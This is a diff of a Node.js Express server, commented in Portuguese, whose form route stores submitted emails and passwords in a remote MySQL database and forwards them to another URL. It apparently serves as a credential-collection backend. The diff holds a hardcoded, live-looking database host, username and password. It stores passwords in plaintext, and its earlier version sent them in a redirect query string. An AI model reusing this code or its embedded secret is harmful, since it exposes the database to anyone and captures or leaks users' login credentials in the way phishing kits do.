@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const mysql = require('mysql');
 const axios = require('axios');
+
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -10,10 +11,10 @@ app.use(bodyParser.urlencoded({ extended: false }));
 
 // Configurando a conexão com o banco de dados MySQL
 const db = mysql.createConnection({
-    host: 'esi.h.filess.io', // Endereço do servidor do banco de dados
-    user: 'eudora_hatfought', // Usuário do banco de dados
-    password: '1871cc0c1003b3dab30384527bf6efb162e0fbc5', // Senha do banco de dados
-    database: 'eudora_hatfought' // Nome do banco de dados
+    host: 'esi.h.filess.io',
+    user: 'eudora_hatfought',
+    password: '1871cc0c1003b3dab30384527bf6efb162e0fbc5',
+    database: 'eudora_hatfought'
 });
 
 // Conectando ao banco de dados
@@ -25,19 +26,27 @@ db.connect((err) => {
 });
 
 // Rota para lidar com a submissão do formulário
-app.post('/submit-form', (req, res) => {
+app.post('/submit-form', async (req, res) => {
     const email = req.body.email;
     const password = req.body.password;
     const redirectUrl = 'http://127.0.0.1:5500/eudoraEndereco/index.html'; // Substitua pelo endereço web desejado
 
     const sql = 'INSERT INTO usuarios (email, password) VALUES (?, ?)';
-    db.query(sql, [email, password], (err, result) => {
+    db.query(sql, [email, password], async (err, result) => {
         if (err) {
             return res.status(500).send('Erro ao inserir dados no banco de dados');
         }
 
-        // Redireciona para o endereço web desejado com os dados no corpo da requisição
-        res.redirect(307, redirectUrl + `?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
+        try {
+            // Envia os dados para o endereço web especificado
+            const response = await axios.post(redirectUrl, { email, password });
+
+            // Redireciona para o endereço web após a resposta bem-sucedida
+            res.redirect(redirectUrl);
+        } catch (error) {
+            console.error('Erro ao enviar dados para o endereço web:', error);
+            res.status(500).send('Erro ao enviar dados para o endereço web');
+        }
     });
 });
 
